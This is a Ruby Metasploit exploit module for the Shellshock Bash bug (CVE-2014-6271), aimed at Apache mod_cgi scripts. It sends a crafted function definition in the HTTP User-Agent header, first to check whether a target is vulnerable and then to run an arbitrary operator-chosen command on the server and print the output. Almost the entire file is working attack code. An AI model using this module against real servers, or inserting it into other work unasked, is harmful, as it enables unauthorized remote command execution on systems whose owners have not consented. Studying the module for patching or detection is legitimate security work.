require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  #include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Apache mod_cgi Bash Environment Variable Code Injection',
      'Description' => %q{
        This module exploits a code injection in specially crafted environment
        variables in Bash, specifically targeting Apache mod_cgi scripts through
        the HTTP_USER_AGENT variable.
      },
      'Author' => [
        'Stephane Chazelas', # Vulnerability discovery
        'Pablo GonzÃ¡lez' 
      ],
      'References' => [
        ['CVE', '2014-6271'],
        ['URL', 'https://access.redhat.com/articles/1200223'],
        ['URL', 'http://seclists.org/oss-sec/2014/q3/649']
      ],
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 2048
        },
      'Targets'        =>
        [
          [ 'Linux x86',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86
            }
          ],
          [ 'Linux x86_64',
            {
              'Platform'        => 'linux',
              'Arch'            => ARCH_X86_64
            }
          ]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Sep 24 2014',
      'License' => MSF_LICENSE
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Path to CGI script']),
      OptEnum.new('METHOD', [true, 'HTTP method to use', 'GET', ['GET', 'POST']]),
      OptString.new('RPATH', [true, 'Target PATH for binaries used by the CmdStager', '/bin']),
	  OptString.new('COMMAND', [true, 'Command Injection in Bash', 'ls -la']),
      OptInt.new('TIMEOUT', [true, 'HTTP read response timeout (seconds)', 5])
    ], self.class)
  end

  def check
	print_status target_uri.path.to_s
	r = send_request_cgi({
        'method' => datastore['METHOD'],
        'uri' => datastore['TARGETURI'],
        'agent' => "() { :; }; echo; echo hola} "
      }, datastore['TIMEOUT'])
	  
	  if r.body.include?("hola")
		Exploit::CheckCode::Vulnerable
	  else
		Exploit::CheckCode::Safe
	  end

  end

  def exploit


	 r = send_request_cgi(
      {
        'method' => datastore['METHOD'],
        'uri' => normalize_uri(target_uri.path.to_s),
        'agent' => "() { :; }; echo; #{datastore['RPATH']}/#{datastore['COMMAND']} "
      }, datastore['TIMEOUT'])
		
	 print_status "() { :; }; echo; #{datastore['RPATH']}/#{datastore['COMMAND']} "

	 #print_status r.to_s 
		
	 begin
		print_status r.body
     rescue
		print_status "body empty"
	 end
	
  end

end
